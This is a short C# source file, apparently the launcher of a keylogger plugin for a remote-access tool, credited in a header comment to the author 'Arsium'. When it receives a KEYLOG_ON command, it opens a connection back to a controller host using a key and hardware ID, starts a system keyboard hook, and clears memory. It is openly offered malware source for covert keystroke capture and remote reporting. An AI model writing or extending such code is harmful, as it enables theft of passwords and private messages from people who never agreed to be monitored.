﻿using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Keylogger based on async with improvements ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;
        internal static string key;
        internal static string baseIp;
        internal static string HWID;
        public static void Main(LoadingAPI loadingAPI)
        {
            Launch.key = loadingAPI.key;
            Launch.baseIp = loadingAPI.baseIp;
            Launch.HWID = loadingAPI.HWID;

            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.KEYLOG_ON:
                    clientHandler = new ClientHandler(loadingAPI.host, key);
                    clientHandler.ConnectStart();
                    KeyLib.Hook.StartHooking();
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
